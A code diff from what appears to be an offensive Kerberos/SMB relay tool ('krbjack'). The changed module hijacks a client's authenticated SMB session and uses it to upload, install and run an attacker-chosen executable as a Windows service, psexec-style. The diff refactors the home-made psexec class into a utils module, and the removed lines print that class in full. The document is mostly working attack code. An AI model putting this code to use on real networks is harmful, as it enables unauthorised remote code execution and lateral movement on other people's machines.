@@ -1,12 +1,8 @@
 from scapy.layers.smb2 import SMB2_Header, SMB2_Session_Setup_Request
+from krbjack.modules.utils import HomeBackedPSEXEC
 from impacket.smbconnection import SessionError
 from scapy.layers.kerberos import KRB_AP_REQ
 from scapy.layers.gssapi import SPNEGO_Token
-from impacket.examples import serviceinstall
-from impacket.dcerpc.v5 import transport
-from uuid import uuid4
-import logging
-import sys
 
 from .utils import getAuthenticatedImpacketSMBConnection
 
@@ -71,7 +67,9 @@ class Module:
     #   False/unsuccessful -> forwarding is set up again, the client is added to
     #       the whitelist of clients not to inspect traffic from.
     def run(self, jacker, client_ip, the_packet):
-        print("=== PSEXEC module ===")
+        if jacker.args.executable is None:
+            return False
+        print("=== KRB hijacking module ===")
         pkt = SMB2_Header(the_packet[4:])
         # Fetch the AP_REQ
         apreq = (
@@ -101,7 +99,7 @@ class Module:
             print("\t=== Admin connection set up !!!")
             print("\t=== Launching home-baked/modified psexec ...")
             # Runs our modified/simpler psexec
-            executer = __class__.HomeBackedPSEXEC(jacker.args.executable)
+            executer = HomeBackedPSEXEC(jacker.args.executable)
             self.service = executer.run(connection)
             if self.service is not None:
                 print("\tService installed and running !")
@@ -117,46 +115,3 @@ class Module:
         if self.service is not None:
             print("\tUninstalling service ...")
             self.service.uninstall()
-
-    # Our home made psexec. It is basically much simpler that the impacket one
-    # because we dont need to perform any sort of authentication, and because
-    # we dont care to get it interactive.
-    # It can be set up from a custom SMBConnection though, what we need here to
-    # run it from a hijacked SMB connection obtained through scapy !
-    class HomeBackedPSEXEC:
-        def __init__(self, exeFile):
-            self.__exeFile = exeFile
-            self.__serviceName = str(uuid4())
-
-        def run(self, connection):
-            print("\tHijacking SMB session for DCE transport ...")
-            rpctransport = transport.SMBTransport(remoteName=connection.getRemoteName())
-            rpctransport.set_smb_connection(connection)
-            return self.doStuff(rpctransport)
-
-        def doStuff(self, rpctransport):
-            # Sets up the DCE/RPC connection through SMB
-            dce = rpctransport.get_dce_rpc()
-            try:
-                dce.connect()
-            except Exception as e:
-                if logging.getLogger().level == logging.DEBUG:
-                    import traceback
-                    traceback.print_exc()
-                logging.critical(str(e))
-                sys.exit(1)
-            global dialect
-            dialect = rpctransport.get_smb_connection().getDialect()
-            # Copy, install and run the service
-            f = open(self.__exeFile, 'rb')
-            installService = serviceinstall.ServiceInstall(
-                rpctransport.get_smb_connection(), f, self.__serviceName
-            )
-            print(f"\tInstalling service {self.__serviceName}")
-            if installService.install() is False:
-                f.close()
-                print("\tService installation error :-(")
-                return None
-            f.close()
-            # Returns the service to be able to uninstall it later
-            return installService
